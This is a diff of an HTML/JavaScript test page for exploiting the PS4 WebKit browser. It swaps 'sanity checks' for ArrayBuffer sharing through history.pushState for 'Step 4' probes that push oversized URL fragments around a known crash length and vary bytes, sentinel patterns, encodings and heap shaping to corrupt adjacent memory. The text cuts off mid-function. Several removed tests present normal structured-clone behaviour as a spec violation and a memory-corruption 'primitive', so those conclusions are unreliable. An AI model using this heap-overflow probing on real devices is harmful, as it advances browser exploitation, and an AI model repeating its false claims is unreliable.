@@ -2,894 +2,392 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit Sanity Check</title>
+<title>PS4 WebKit - Step 4</title>
+<style>
+body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+button { margin: 5px; padding: 10px; font-size: 14px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
+button:hover { background: #0f0; color: #000; }
+#log { white-space: pre-wrap; margin-top: 20px; border: 1px solid #0f0; padding: 10px; max-height: 600px; overflow-y: auto; }
+.critical { color: #f00; font-weight: bold; }
+.pass { color: #0f0; }
+.warn { color: #ff0; }
+.info { color: #0ff; }
+h2 { color: #0ff; border-bottom: 2px solid #0ff; }
+.test-section { margin: 20px 0; padding: 10px; border: 1px solid #444; }
+</style>
 </head>
 <body>
 
-<h1>PS4 WebKit - Sanity Check Tests</h1>
+<h2>STEP 4: Neighbor Identification Tests</h2>
+<p class="info">Known crash: size 977 + 14461 | Safe: size 977 + 14460</p>
 
-<p><b>OBJECTIVE: Verify if primitives are REAL or FALSE POSITIVES</b></p>
+<div class="test-section">
+<h3>TEST 4.1 - Controlled Byte Impact</h3>
+<button onclick="test41_byteImpact()">RUN 4.1</button>
+<p>Tests if changing the CONTENT of overflow byte changes crash behavior</p>
+</div>
 
-<p>These tests will RIGOROUSLY verify:</p>
-<ol>
-<li>Is the write primitive REALLY writing to shared memory?</li>
-<li>Is the read primitive REALLY reading different memory?</li>
-<li>Are we REALLY bypassing memory isolation?</li>
-<li>Can we PROVE memory corruption happened?</li>
-</ol>
+<div class="test-section">
+<h3>TEST 4.2 - Sentinel Patterns</h3>
+<button onclick="test42_sentinelPatterns()">RUN 4.2</button>
+<p>Tests if specific byte patterns appear in crash behavior</p>
+</div>
 
-<hr>
+<div class="test-section">
+<h3>TEST 4.3 - UTF-16 vs UTF-8 Edge Cases</h3>
+<button onclick="test43_encodingEdges()">RUN 4.3</button>
+<p>Tests encoding-based size confusion (common WebKit bug)</p>
+</div>
 
-<h2>Sanity Tests</h2>
+<div class="test-section">
+<h3>TEST 4.4 - StringImpl Adjacent Corruption</h3>
+<button onclick="test44_stringImplTarget()">RUN 4.4</button>
+<p>Tests if overflow corrupts adjacent StringImpl structure</p>
+</div>
 
-<button onclick="sanityTest1()">SANITY 1: Verify Shared Buffer Write (CRITICAL)</button><br>
-<button onclick="sanityTest2()">SANITY 2: Verify Independent Cloning (Control)</button><br>
-<button onclick="sanityTest3()">SANITY 3: Verify Memory Corruption Evidence</button><br>
-<button onclick="sanityTest4()">SANITY 4: Verify Cross-Reference Writes</button><br>
-<button onclick="sanityTest5()">SANITY 5: Verify Buffer Identity vs Copy</button><br>
-<button onclick="sanityTest6()">SANITY 6: Verify OOB is Real (Not Bounds Check)</button><br>
-<button onclick="sanityTest7()">SANITY 7: Verify Circular Refs NOT Serialized</button><br>
-<button onclick="sanityTest8()">SANITY 8: Multiple Write Verification</button><br>
-<button onclick="sanityTest9()">SANITY 9: Pattern Corruption Test</button><br>
-<button onclick="sanityTest10()">SANITY 10: Final Verdict Test</button><br>
-<br>
+<div class="test-section">
+<h3>TEST 4.5 - Heap Layout Influence</h3>
+<button onclick="test45_heapShaping()">RUN 4.5</button>
+<p>Tests if heap shaping changes crash behavior (confirms neighbor sensitivity)</p>
+</div>
+
+<div class="test-section">
+<h3>TEST 4.6 - NULL Byte Termination</h3>
+<button onclick="test46_nullByte()">RUN 4.6</button>
+<p>Tests if NULL byte prevents/changes crash (indicates string length corruption)</p>
+</div>
+
+<div class="test-section">
+<button onclick="runAllTests()" style="background: #f00; color: #fff; font-size: 16px; font-weight: bold;">⚠️ RUN ALL TESTS (MAY CRASH)</button>
 <button onclick="clearLog()">Clear Log</button>
-<button onclick="exportResults()">Export Results</button>
-
-<hr>
+</div>
 
 <div id="log"></div>
 
 <script>
-const logEl = document.getElementById("log");
-let testResults = [];
+const SAFE_BASE = 977;
+const SAFE_OFFSET = 14460;
+const CRASH_OFFSET = 14461;
 
-function log(msg) {
-    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
-    const line = '[' + timestamp + '] ' + msg;
-    logEl.textContent += line + '\n';
-    testResults.push({timestamp, message: msg});
+function log(msg, type = 'info') {
+    const logEl = document.getElementById("log");
+    const timestamp = new Date().toLocaleTimeString();
+    const className = type;
+    logEl.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span>\n`;
     logEl.scrollTop = logEl.scrollHeight;
 }
 
 function clearLog() {
-    logEl.textContent = '';
-    testResults = [];
+    document.getElementById("log").innerHTML = '';
 }
 
-function exportResults() {
-    const report = {
-        title: 'PS4 WebKit Sanity Check Results',
-        timestamp: new Date().toISOString(),
-        verdict: 'See final test for conclusion',
-        tests: testResults
-    };
-    
-    const blob = new Blob([JSON.stringify(report, null, 2)], {type: 'application/json'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'ps4_sanity_check_' + Date.now() + '.json';
-    a.click();
-    log('Sanity check results exported');
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// SANITY 1: Most Critical - Verify Shared Buffer Write
-function sanityTest1() {
-    log('=== SANITY TEST 1: Verify Shared Buffer Write ===');
-    log('[CRITICAL] This is the most important test!');
-    log('');
+// TEST 4.1 - Controlled Byte Impact
+async function test41_byteImpact() {
+    log('=== TEST 4.1: Controlled Byte Impact ===', 'critical');
+    log('Testing if changing overflow byte CONTENT changes crash behavior', 'info');
     
-    try {
-        // Create buffer with KNOWN pattern
-        const buffer = new ArrayBuffer(256);
-        const view = new Uint32Array(buffer);
-        
-        // Fill with unique pattern
-        const MAGIC1 = 0x12345678;
-        const MAGIC2 = 0x9ABCDEF0;
-        view[0] = MAGIC1;
-        view[1] = MAGIC2;
-        view[10] = 0xAAAAAAAA;
-        view[20] = 0xBBBBBBBB;
-        
-        log('[SETUP] Created buffer with magic values:');
-        log('  view[0]  = 0x' + view[0].toString(16) + ' (expect 0x12345678)');
-        log('  view[1]  = 0x' + view[1].toString(16) + ' (expect 0x9ABCDEF0)');
-        log('  view[10] = 0x' + view[10].toString(16) + ' (expect 0xAAAAAAAA)');
-        log('  view[20] = 0x' + view[20].toString(16) + ' (expect 0xBBBBBBBB)');
-        log('');
-        
-        // Create circular structure
-        const obj = {
-            id: 'sanity1',
-            buffer: buffer,
-            view: view,
-            self: null
-        };
-        obj.self = obj;
-        
-        log('[ACTION] Created circular structure');
-        log('[ACTION] Pushing to history.pushState...');
-        
-        history.pushState(obj, "", "#sanity1");
-        
-        log('[ACTION] Successfully pushed to history');
-        log('');
-        
-        // Retrieve
-        const retrieved = history.state;
-        
-        log('[VERIFY] Retrieved from history');
-        log('[VERIFY] Checking if buffer is shared or cloned...');
-        log('');
-        
-        // Create NEW view from retrieved buffer
-        const retrievedView = new Uint32Array(retrieved.buffer);
-        
-        log('[READ] Original values from retrieved buffer:');
-        log('  retrievedView[0]  = 0x' + retrievedView[0].toString(16));
-        log('  retrievedView[1]  = 0x' + retrievedView[1].toString(16));
-        log('  retrievedView[10] = 0x' + retrievedView[10].toString(16));
-        log('  retrievedView[20] = 0x' + retrievedView[20].toString(16));
-        log('');
-        
-        // NOW THE CRITICAL TEST: Write through retrieved view
-        const TEST_VALUE1 = 0xDEADBEEF;
-        const TEST_VALUE2 = 0xCAFEBABE;
-        
-        log('[CRITICAL TEST] Writing NEW values through retrieved view:');
-        retrievedView[0] = TEST_VALUE1;
-        retrievedView[1] = TEST_VALUE2;
-        log('  Wrote 0xDEADBEEF to retrievedView[0]');
-        log('  Wrote 0xCAFEBABE to retrievedView[1]');
-        log('');
-        
-        // Read through circular reference (retrieved.self.buffer)
-        log('[CRITICAL TEST] Reading through CIRCULAR reference (retrieved.self):');
-        
-        if(!retrieved.self) {
-            log('[ERROR] Circular reference lost! This is bad.');
-            return;
-        }
-        
-        const circularView = new Uint32Array(retrieved.self.buffer);
-        const circularValue1 = circularView[0];
-        const circularValue2 = circularView[1];
-        
-        log('  circularView[0] = 0x' + circularValue1.toString(16));
-        log('  circularView[1] = 0x' + circularValue2.toString(16));
-        log('');
-        
-        // VERDICT
-        log('=== VERDICT ===');
-        if(circularValue1 === TEST_VALUE1 && circularValue2 === TEST_VALUE2) {
-            log('[REAL] Shared buffer CONFIRMED!');
-            log('[REAL] Write through one ref, read through another!');
-            log('[REAL] This is NOT a false positive!');
-            log('[REAL] Memory is SHARED, not cloned!');
-            log('');
-            log('[EXPLOIT CONFIRMED] This is a real write primitive!');
-        } else {
-            log('[FALSE POSITIVE] Buffers are NOT shared');
-            log('[FALSE POSITIVE] Expected: 0xDEADBEEF, 0xCAFEBABE');
-            log('[FALSE POSITIVE] Got: 0x' + circularValue1.toString(16) + ', 0x' + circularValue2.toString(16));
-            log('[FALSE POSITIVE] This might be normal cloning behavior');
-        }
-        log('');
-        
-        // Also check if ORIGINAL local view changed
-        log('[BONUS CHECK] Checking if ORIGINAL local view also changed:');
-        log('  Original view[0] = 0x' + view[0].toString(16));
-        log('  Original view[1] = 0x' + view[1].toString(16));
-        
-        if(view[0] === TEST_VALUE1 && view[1] === TEST_VALUE2) {
-            log('[CRITICAL] Original local buffer ALSO changed!');
-            log('[CRITICAL] This proves buffers are TRULY shared!');
-        } else {
-            log('[INFO] Original local buffer unchanged (expected if cloned)');
-        }
-        
-    } catch(e) {
-        log('[ERROR] Exception: ' + e.message);
-        if(e.stack) log('Stack: ' + e.stack);
-    }
-}
-
-// SANITY 2: Control Test - Verify Normal Cloning
-function sanityTest2() {
-    log('=== SANITY TEST 2: Control - Verify Normal Cloning ===');
-    log('[CONTROL] Testing WITHOUT circular reference');
-    log('');
+    const basePayload = "A".repeat(SAFE_BASE);
+    const testBytes = [
+        { name: 'All A', char: 'A', repeat: CRASH_OFFSET },
+        { name: 'All B', char: 'B', repeat: CRASH_OFFSET },
+        { name: 'All C', char: 'C', repeat: CRASH_OFFSET },
+        { name: 'All X', char: 'X', repeat: CRASH_OFFSET },
+        { name: 'All Z', char: 'Z', repeat: CRASH_OFFSET },
+        { name: 'A + last B', char: 'A', repeat: CRASH_OFFSET - 1, last: 'B' },
+        { name: 'A + last 0', char: 'A', repeat: CRASH_OFFSET - 1, last: String.fromCharCode(0) },
+        { name: 'A + last FF', char: 'A', repeat: CRASH_OFFSET - 1, last: String.fromCharCode(255) }
+    ];
     
-    try {
-        const buffer = new ArrayBuffer(256);
-        const view = new Uint32Array(buffer);
-        
-        view[0] = 0x11111111;
-        view[1] = 0x22222222;
-        
-        log('[SETUP] Created buffer without circular ref');
-        log('  view[0] = 0x' + view[0].toString(16));
-        log('  view[1] = 0x' + view[1].toString(16));
-        log('');
-        
-        // NO circular reference
-        const obj = {
-            id: 'control',
-            buffer: buffer,
-            view: view
-            // NO self: null
-        };
-        
-        history.pushState(obj, "", "#control");
-        log('[ACTION] Pushed to history (no circular ref)');
-        log('');
-        
-        const retrieved = history.state;
-        const retrievedView = new Uint32Array(retrieved.buffer);
-        
-        log('[READ] Retrieved values:');
-        log('  retrievedView[0] = 0x' + retrievedView[0].toString(16));
-        log('  retrievedView[1] = 0x' + retrievedView[1].toString(16));
-        log('');
-        
-        // Write through retrieved
-        retrievedView[0] = 0xAAAAAAAA;
-        retrievedView[1] = 0xBBBBBBBB;
-        
-        log('[WRITE] Wrote new values through retrieved view');
-        log('');
-        
-        // Check original
-        log('[CONTROL CHECK] Original local view:');
-        log('  view[0] = 0x' + view[0].toString(16));
-        log('  view[1] = 0x' + view[1].toString(16));
-        log('');
-        
-        if(view[0] === 0x11111111 && view[1] === 0x22222222) {
-            log('[EXPECTED] Original buffer UNCHANGED');
-            log('[EXPECTED] This is normal cloning behavior');
-            log('[EXPECTED] Buffers are properly isolated');
-        } else {
-            log('[UNEXPECTED] Original buffer CHANGED!');
-            log('[UNEXPECTED] Even without circular ref, buffers are shared!');
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-}
-
-// SANITY 3: Verify Memory Corruption Evidence
-function sanityTest3() {
-    log('=== SANITY TEST 3: Memory Corruption Evidence ===');
-    log('[TEST] Looking for signs of actual corruption');
-    log('');
-    
-    try {
-        // Create object with sentinel values
-        const obj1 = {
-            sentinel_start: 0xAAAAAAAA,
-            data: 'X'.repeat(100),
-            sentinel_end: 0xBBBBBBBB
-        };
-        
-        const obj2 = {
-            sentinel_start: 0xCCCCCCCC,
-            data: 'Y'.repeat(100),
-            sentinel_end: 0xDDDDDDDD,
-            ref: obj1
-        };
-        
-        log('[SETUP] Created objects with sentinel values');
-        log('  obj1: start=0xAAAAAAAA, end=0xBBBBBBBB');
-        log('  obj2: start=0xCCCCCCCC, end=0xDDDDDDDD');
-        log('');
-        
-        // Push both
-        history.pushState(obj1, "", "#sentinel1");
-        history.pushState(obj2, "", "#sentinel2");
-        
-        log('[ACTION] Pushed both to history');
-        log('');
-        
-        // Check if sentinels are preserved
-        history.back();
-        const check1 = history.state;
-        
-        log('[VERIFY] Retrieved obj2:');
-        log('  sentinel_start: 0x' + check1.sentinel_start.toString(16));
-        log('  sentinel_end: 0x' + check1.sentinel_end.toString(16));
-        
-        if(check1.sentinel_start !== 0xCCCCCCCC || check1.sentinel_end !== 0xDDDDDDDD) {
-            log('[CORRUPTION!] Sentinels changed!');
-            log('[CORRUPTION!] This is evidence of memory corruption!');
-        } else {
-            log('[OK] Sentinels intact');
-        }
-        log('');
-        
-        if(check1.ref) {
-            log('[VERIFY] Checking nested obj1 through ref:');
-            log('  ref.sentinel_start: 0x' + check1.ref.sentinel_start.toString(16));
-            log('  ref.sentinel_end: 0x' + check1.ref.sentinel_end.toString(16));
-            
-            if(check1.ref.sentinel_start !== 0xAAAAAAAA || check1.ref.sentinel_end !== 0xBBBBBBBB) {
-                log('[CORRUPTION!] Nested object sentinels changed!');
-            } else {
-                log('[OK] Nested sentinels intact');
-            }
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-}
-
-// SANITY 4: Cross-Reference Write Test
-function sanityTest4() {
-    log('=== SANITY TEST 4: Cross-Reference Write Verification ===');
-    log('[TEST] Write through multiple paths, verify all see changes');
-    log('');
-    
-    try {
-        const buffer = new ArrayBuffer(128);
-        const view = new Uint32Array(buffer);
-        
-        // Set initial pattern
-        for(let i = 0; i < 5; i++) {
-            view[i] = 0x10101010 + i;
-        }
-        
-        log('[SETUP] Buffer initialized with pattern');
-        
-        // Create complex circular structure
-        const obj = {
-            id: 'multi',
-            buf: buffer,
-            view1: view,
-            view2: new Uint8Array(buffer),
-            self: null,
-            nested: null
-        };
-        
-        const nested = {
-            parent: obj,
-            buf: buffer,
-            view3: new Uint32Array(buffer)
-        };
-        
-        obj.nested = nested;
-        obj.self = obj;
-        
-        log('[SETUP] Created multi-path circular structure');
-        history.pushState(obj, "", "#multi");
-        log('');
-        
-        const retrieved = history.state;
-        
-        // Write through path 1: retrieved.view1
-        const v1 = new Uint32Array(retrieved.buf);
-        v1[0] = 0xAAAAAAAA;
-        log('[WRITE PATH 1] Wrote 0xAAAAAAAA to index 0 via retrieved.buf');
-        
-        // Read through path 2: retrieved.self.view1
-        if(retrieved.self && retrieved.self.buf) {
-            const v2 = new Uint32Array(retrieved.self.buf);
-            log('[READ PATH 2] Via retrieved.self.buf: 0x' + v2[0].toString(16));
-            
-            if(v2[0] === 0xAAAAAAAA) {
-                log('  [SHARED] Path 2 sees write from path 1!');
-            } else {
-                log('  [ISOLATED] Path 2 does NOT see write from path 1');
-            }
-        }
-        
-        // Read through path 3: retrieved.nested.buf
-        if(retrieved.nested && retrieved.nested.buf) {
-            const v3 = new Uint32Array(retrieved.nested.buf);
-            log('[READ PATH 3] Via retrieved.nested.buf: 0x' + v3[0].toString(16));
-            
-            if(v3[0] === 0xAAAAAAAA) {
-                log('  [SHARED] Path 3 sees write from path 1!');
-            } else {
-                log('  [ISOLATED] Path 3 does NOT see write from path 1');
-            }
-        }
-        
-        log('');
-        log('[VERDICT]');
-        const v2 = retrieved.self ? new Uint32Array(retrieved.self.buf) : null;
-        const v3 = retrieved.nested ? new Uint32Array(retrieved.nested.buf) : null;
-        
-        if(v2 && v3 && v2[0] === 0xAAAAAAAA && v3[0] === 0xAAAAAAAA) {
-            log('[REAL] ALL PATHS see the same write!');
-            log('[REAL] This proves shared memory!');
-        } else {
-            log('[FALSE POSITIVE] Not all paths see the write');
-            log('[FALSE POSITIVE] Buffers might be cloned');
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-}
-
-// SANITY 5: Buffer Identity Test
-function sanityTest5() {
-    log('=== SANITY TEST 5: Buffer Identity vs Copy ===');
-    log('[TEST] Check if buffers have same identity');
-    log('');
-    
-    try {
-        const buffer = new ArrayBuffer(64);
-        const view = new Uint32Array(buffer);
-        view[0] = 0x99999999;
-        
-        const obj = {
-            buf: buffer,
-            self: null
-        };
-        obj.self = obj;
-        
-        history.pushState(obj, "", "#identity");
-        
-        const retrieved = history.state;
-        
-        log('[TEST] Comparing buffer references:');
-        log('  retrieved.buf === retrieved.self.buf?');
-        
-        const same = retrieved.buf === retrieved.self.buf;
-        log('  Result: ' + same);
-        log('');
-        
-        if(same) {
-            log('[REAL] Buffers have SAME identity!');
-            log('[REAL] This is JavaScript reference equality!');
-            log('[REAL] Proves they are the same object in memory!');
-        } else {
-            log('[FALSE POSITIVE] Buffers are different objects');
-            log('[FALSE POSITIVE] They were cloned');
-        }
-        
-        // Additional check: byteLength comparison
-        log('');
-        log('[ADDITIONAL] Checking buffer properties:');
-        log('  retrieved.buf.byteLength: ' + retrieved.buf.byteLength);
-        log('  retrieved.self.buf.byteLength: ' + retrieved.self.buf.byteLength);
-        
-        // Try to get internal buffer identity (if possible)
-        const str1 = String(retrieved.buf);
-        const str2 = String(retrieved.self.buf);
-        log('  retrieved.buf toString: ' + str1);
-        log('  retrieved.self.buf toString: ' + str2);
-        
-        if(str1 === str2 && str1.includes('ArrayBuffer')) {
-            log('  [INFO] String representations are identical');
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-}
-
-// SANITY 6: Verify OOB is Real
-function sanityTest6() {
-    log('=== SANITY TEST 6: Verify OOB is Real (Not Bounds Check) ===');
-    log('[TEST] Check if OOB write actually escapes bounds');
-    log('');
-    
-    try {
-        const buffer = new ArrayBuffer(64); // Only 16 uint32s
-        const view = new Uint32Array(buffer);
-        
-        // Fill with known pattern
-        for(let i = 0; i < view.length; i++) {
-            view[i] = 0x40404040 + i;
-        }
-        
-        log('[SETUP] Created 64-byte buffer (16 uint32 elements)');
-        log('[SETUP] Valid indices: 0-15');
-        log('');
-        
-        const obj = {buf: buffer, self: null};
-        obj.self = obj;
-        
-        history.pushState(obj, "", "#oob");
-        
-        const retrieved = history.state;
-        const testView = new Uint32Array(retrieved.buf);
-        
-        log('[TEST] Attempting to write at index 16 (OOB):');
-        
+    for (let i = 0; i < testBytes.length; i++) {
+        const test = testBytes[i];
         try {
-            testView[16] = 0xDEADBEEF;
-            log('  [WRITE] testView[16] = 0xDEADBEEF - No exception thrown!');
+            await delay(100);
+            let payload = basePayload + test.char.repeat(test.repeat);
+            if (test.last) payload += test.last;
             
-            // Try to read back
-            const readback = testView[16];
-            log('  [READ] testView[16] = ' + (readback ? '0x' + readback.toString(16) : 'undefined'));
-            
-            if(readback === 0xDEADBEEF) {
-                log('');
-                log('[REAL] OOB WRITE CONFIRMED!');
-                log('[REAL] Wrote and read beyond buffer bounds!');
-                log('[REAL] This is actual memory corruption!');
-            } else if(readback === undefined) {
-                log('');
-                log('[FALSE POSITIVE] Write succeeded but read returned undefined');
-                log('[FALSE POSITIVE] Might be JavaScript property, not memory');
-            } else {
-                log('');
-                log('[UNEXPECTED] Read different value: 0x' + readback.toString(16));
-            }
+            log(`  [${i+1}/${testBytes.length}] Testing: ${test.name}`, 'warn');
+            history.pushState({}, "", "#" + payload);
+            log(`    ✓ Survived (size: ${payload.length})`, 'pass');
             
         } catch(e) {
-            log('  [PREVENTED] Exception: ' + e.message);
-            log('  [FALSE POSITIVE] OOB access was prevented by bounds checking');
+            log(`    ✗ Exception: ${e.message}`, 'critical');
         }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
     }
+    
+    log('TEST 4.1 completed - analyze if different bytes cause different behavior\n', 'info');
 }
 
-// SANITY 7: Verify Circular Refs NOT Serialized
-function sanityTest7() {
-    log('=== SANITY TEST 7: Verify Circular Refs NOT Properly Serialized ===');
-    log('[TEST] Confirming spec violation');
-    log('');
+// TEST 4.2 - Sentinel Patterns
+async function test42_sentinelPatterns() {
+    log('=== TEST 4.2: Sentinel Patterns ===', 'critical');
+    log('Testing classic exploitation patterns', 'info');
     
-    try {
-        // According to HTML5 spec, this SHOULD throw DataCloneError
-        const circular = {id: 'test'};
-        circular.self = circular;
-        
-        log('[TEST] Attempting to push circular reference...');
-        log('[SPEC] HTML5 spec says this MUST throw DataCloneError');
-        log('');
-        
+    const patterns = [
+        { name: 'AAAA pattern', pattern: 'AAAA' },
+        { name: 'BBBB pattern', pattern: 'BBBB' },
+        { name: 'CCCC pattern', pattern: 'CCCC' },
+        { name: 'ABAB pattern', pattern: 'ABAB' },
+        { name: 'BABA pattern', pattern: 'BABA' },
+        { name: 'DEADBEEF', pattern: 'DEAD' },
+        { name: '41414141', pattern: String.fromCharCode(0x41, 0x41, 0x41, 0x41) },
+        { name: '42424242', pattern: String.fromCharCode(0x42, 0x42, 0x42, 0x42) }
+    ];
+    
+    for (let i = 0; i < patterns.length; i++) {
+        const test = patterns[i];
         try {
-            history.pushState(circular, "", "#circular_test");
-            log('[VIOLATION] pushState ACCEPTED circular reference!');
-            log('[VIOLATION] This violates HTML5 structured clone algorithm!');
-            log('[VIOLATION] This confirms the bug exists!');
-            log('');
+            await delay(100);
+            const base = "A".repeat(SAFE_BASE);
+            const filling = test.pattern.repeat(Math.floor(CRASH_OFFSET / test.pattern.length));
+            const payload = base + filling + test.pattern.substring(0, CRASH_OFFSET - filling.length);
             
-            const retrieved = history.state;
-            if(retrieved && retrieved.self === retrieved) {
-                log('[CONFIRMED] Circular reference preserved!');
-                log('[CONFIRMED] retrieved.self === retrieved: true');
-                log('[CONFIRMED] This is the core vulnerability!');
-            }
+            log(`  [${i+1}/${patterns.length}] Testing: ${test.name}`, 'warn');
+            history.pushState({}, "", "#" + payload);
+            log(`    ✓ Survived with pattern`, 'pass');
             
         } catch(e) {
-            log('[SPEC COMPLIANT] Threw exception: ' + e.message);
-            log('[FALSE POSITIVE] Browser is actually following spec!');
-            log('[FALSE POSITIVE] Previous tests might be wrong!');
+            log(`    ✗ Crashed with: ${e.message}`, 'critical');
         }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
     }
-}
-
-// SANITY 8: Multiple Write Verification
-function sanityTest8() {
-    log('=== SANITY TEST 8: Multiple Write Verification ===');
-    log('[TEST] Write multiple values, verify all persist');
-    log('');
     
-    try {
-        const buffer = new ArrayBuffer(256);
-        const view = new Uint32Array(buffer);
-        
-        const obj = {buf: buffer, self: null};
-        obj.self = obj;
-        
-        history.pushState(obj, "", "#multiwrite");
-        
-        const retrieved = history.state;
-        const wview = new Uint32Array(retrieved.buf);
-        const rview = new Uint32Array(retrieved.self.buf);
-        
-        log('[TEST] Writing 10 different values:');
-        
-        const testValues = [
-            0xDEADBEEF, 0xCAFEBABE, 0x12345678, 0x9ABCDEF0,
-            0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD,
-            0xEEEEEEEE, 0xFFFFFFFF
-        ];
-        
-        let allMatch = true;
-        
-        for(let i = 0; i < testValues.length; i++) {
-            wview[i] = testValues[i];
-            const readback = rview[i];
-            
-            const match = readback === testValues[i];
-            log('  [' + i + '] Write: 0x' + testValues[i].toString(16) + 
-                ' | Read: 0x' + readback.toString(16) + 
-                ' | Match: ' + match);
-            
-            if(!match) allMatch = false;
-        }
-        
-        log('');
-        if(allMatch) {
-            log('[REAL] ALL 10 writes verified through circular ref!');
-            log('[REAL] This is strong evidence of shared memory!');
-        } else {
-            log('[FALSE POSITIVE] Not all writes were verified');
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
+    log('TEST 4.2 completed - check if patterns influence crash\n', 'info');
 }
 
-// SANITY 9: Pattern Corruption Test
-function sanityTest9() {
-    log('=== SANITY TEST 9: Pattern Corruption Test ===');
-    log('[TEST] Write complex pattern, verify integrity');
-    log('');
+// TEST 4.3 - UTF-16 vs UTF-8 Edge Cases
+async function test43_encodingEdges() {
+    log('=== TEST 4.3: UTF-16 vs UTF-8 Edge Cases ===', 'critical');
+    log('Testing encoding confusion bugs (common in WebKit)', 'info');
     
-    try {
-        const buffer = new ArrayBuffer(1024);
-        const view = new Uint32Array(buffer);
-        
-        // Write De Bruijn-like pattern
-        for(let i = 0; i < view.length; i++) {
-            view[i] = (i << 24) | (i << 16) | (i << 8) | i;
-        }
-        
-        log('[SETUP] Wrote De Bruijn pattern to buffer');
-        
-        const obj = {buf: buffer, self: null};
-        obj.self = obj;
-        
-        history.pushState(obj, "", "#pattern");
-        
-        const retrieved = history.state;
-        const checkView = new Uint32Array(retrieved.buf);
-        
-        log('[VERIFY] Checking pattern integrity:');
-        
-        let corrupted = 0;
-        for(let i = 0; i < Math.min(20, checkView.length); i++) {
-            const expected = (i << 24) | (i << 16) | (i << 8) | i;
-            const actual = checkView[i];
-            
-            if(actual !== expected) {
-                log('  [CORRUPTION] Index ' + i + ': expected 0x' + 
-                    expected.toString(16) + ', got 0x' + actual.toString(16));
-                corrupted++;
-            }
-        }
-        
-        if(corrupted > 0) {
-            log('');
-            log('[CORRUPTION DETECTED] ' + corrupted + ' values corrupted!');
-            log('[REAL] This is evidence of memory corruption!');
-        } else {
-            log('');
-            log('[OK] Pattern integrity preserved');
-        }
-        
-        // Now corrupt it intentionally
-        log('');
-        log('[TEST] Intentionally corrupting pattern:');
-        checkView[5] = 0xBADBADBAD;
-        checkView[10] = 0xBADBADBAD;
-        
-        // Check via circular ref
-        const verifyView = new Uint32Array(retrieved.self.buf);
-        log('  Verify via circular ref:');
-        log('    [5] = 0x' + verifyView[5].toString(16));
-        log('    [10] = 0x' + verifyView[10].toString(16));
-        
-        if(verifyView[5] === 0xBADBADBAD && verifyView[10] === 0xBADBADBAD) {
-            log('');
-            log('[REAL] Corruption visible through circular ref!');
-            log('[REAL] Confirms shared memory!');
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-}
-
-// SANITY 10: Final Verdict
-function sanityTest10() {
-    log('=== SANITY TEST 10: Final Verdict ===');
-    log('[FINAL] Running comprehensive verification');
-    log('');
+    const encodingTests = [
+        { name: 'ASCII only (A)', char: 'A' },
+        { name: 'Latin-1 (é)', char: 'é' },
+        { name: 'Cyrillic (Я)', char: 'Я' },
+        { name: 'Emoji (🔥)', char: '🔥' },
+        { name: 'Musical (𝄞)', char: '𝄞' },
+        { name: 'Zero-width', char: '\u200B' },
+        { name: 'Combining char', char: 'e\u0301' },
+        { name: 'Null char', char: '\u0000' },
+        { name: 'High surrogate area', char: '\uD800' }
+    ];
     
-    try {
-        let score = 0;
-        const tests = [];
-        
-        // Test 1: Basic shared write
-        {
-            const b = new ArrayBuffer(32);
-            const v = new Uint32Array(b);
-            const o = {buf: b, self: null};
-            o.self = o;
-            history.pushState(o, "", "#final1");
-            const r = history.state;
-            const w = new Uint32Array(r.buf);
-            w[0] = 0x11111111;
-            const c = new Uint32Array(r.self.buf);
-            if(c[0] === 0x11111111) {
-                score++;
-                tests.push('[PASS] Basic shared write');
-            } else {
-                tests.push('[FAIL] Basic shared write');
-            }
-        }
-        
-        // Test 2: Buffer identity
-        {
-            const b = new ArrayBuffer(32);
-            const o = {buf: b, self: null};
-            o.self = o;
-            history.pushState(o, "", "#final2");
-            const r = history.state;
-            if(r.buf === r.self.buf) {
-                score++;
-                tests.push('[PASS] Buffer identity preserved');
-            } else {
-                tests.push('[FAIL] Buffer identity not preserved');
-            }
-        }
-        
-        // Test 3: Circular ref accepted
-        {
-            const o = {id: 'test', self: null};
-            o.self = o;
-            try {
-                history.pushState(o, "", "#final3");
-                score++;
-                tests.push('[PASS] Circular reference accepted (spec violation)');
-            } catch(e) {
-                tests.push('[FAIL] Circular reference rejected (spec compliant)');
-            }
-        }
-        
-        // Test 4: Multiple path verification
-        {
-            const b = new ArrayBuffer(32);
-            const v = new Uint32Array(b);
-            const o = {buf: b, self: null, nested: null};
-            const n = {parent: o, buf: b};
-            o.self = o;
-            o.nested = n;
-            history.pushState(o, "", "#final4");
-            const r = history.state;
-            const w1 = new Uint32Array(r.buf);
-            w1[0] = 0x22222222;
-            const w2 = new Uint32Array(r.self.buf);
-            const w3 = new Uint32Array(r.nested.buf);
-            if(w2[0] === 0x22222222 && w3[0] === 0x22222222) {
-                score++;
-                tests.push('[PASS] Multiple paths see same write');
-            } else {
-                tests.push('[FAIL] Multiple paths do not see same write');
-            }
-        }
-        
-        // Test 5: Persistent write across navigation
-        {
-            const b = new ArrayBuffer(32);
-            const v = new Uint32Array(b);
-            const o = {buf: b, self: null};
-            o.self = o;
-            history.pushState(o, "", "#final5");
-            const r = history.state;
-            const w = new Uint32Array(r.buf);
-            w[0] = 0x33333333;
+    for (let i = 0; i < encodingTests.length; i++) {
+        const test = encodingTests[i];
+        try {
+            await delay(100);
             
-            // Navigate and check
-            history.back();
-            history.forward();
-            const r2 = history.state;
-            const c = new Uint32Array(r2.buf);
+            // Calculate logical length vs byte length
+            const payload = test.char.repeat(SAFE_BASE + CRASH_OFFSET);
+            const logicalLen = payload.length;
+            const byteLen = new Blob([payload]).size;
             
-            if(c[0] === 0x33333333) {
-                score++;
